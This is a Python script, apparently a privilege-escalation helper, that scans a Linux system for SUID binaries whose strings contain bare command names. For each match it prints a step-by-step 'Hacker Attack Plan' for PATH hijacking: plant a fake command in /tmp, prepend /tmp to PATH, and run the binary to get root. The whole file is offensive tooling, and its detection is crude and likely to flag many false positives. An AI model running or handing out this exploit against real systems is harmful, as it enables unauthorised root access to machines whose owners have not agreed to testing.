import os
import subprocess
import re

def scan_path_hijack():
    print("\n[*] Bhai, starting PATH Variable Hijack Scanner...")
    print("[*] Hunting for SUID binaries that call system commands without absolute paths!\n")
    print("==================================================")

    print("[*] Step 1: Finding all SUID binaries on the system (this might take a few seconds)...")
    try:
        # Find all SUID files, ignore errors
        suid_cmd = "find / -perm -4000 -type f 2>/dev/null"
        suid_files = subprocess.check_output(suid_cmd, shell=True).decode('utf-8').strip().split('\n')
    except Exception as e:
        print(f"[-] Failed to find SUID files: {e}")
        return

    # Common commands admins lazily use inside scripts without full paths
    target_commands = ["cat", "ls", "cp", "mv", "rm", "systemctl", "service", "tar", "curl", "wget", "ping", "grep", "awk", "sed"]
    
    found_vulns = 0

    print(f"[+] Found {len(suid_files)} SUID binaries. Analyzing them with 'strings'...\n")

    for file in suid_files:
        if not file: continue
        
        try:
            # Use 'strings' to extract readable text from the compiled binary
            strings_cmd = f"strings {file} 2>/dev/null"
            output = subprocess.check_output(strings_cmd, shell=True).decode('utf-8')
            
            # Split output into lines/words
            words = output.split()
            
            vuln_commands_found = []
            
            for word in words:
                # Check if the exact command is present as an isolated word (not an absolute path)
                if word in target_commands:
                    vuln_commands_found.append(word)

            # Filter duplicates
            vuln_commands_found = list(set(vuln_commands_found))

            if vuln_commands_found:
                print(f"   [!!!] POTENTIAL JACKPOT 🎯 SUID Binary: {file}")
                print(f"   [!!!] Vulnerable Commands Used: {', '.join(vuln_commands_found)}")
                print(f"   [!!!] Hacker Attack Plan:")
                print(f"         1. cd /tmp")
                print(f"         2. echo '/bin/bash' > {vuln_commands_found[0]}")
                print(f"         3. chmod +x {vuln_commands_found[0]}")
                print(f"         4. export PATH=/tmp:$PATH")
                print(f"         5. {file}  <-- RUN THIS TO GET ROOT!\n")
                found_vulns += 1

        except Exception:
            # Skip files that can't be read properly
            continue

    print("==================================================")
    if found_vulns > 0:
        print(f"[+] Scan Complete! Found {found_vulns} potentially vulnerable SUID binaries for PATH Hijacking! 💀")
    else:
        print("[-] Scan Complete. Binaries seem to be using safe absolute paths.")

if __name__ == "__main__":
    scan_path_hijack()
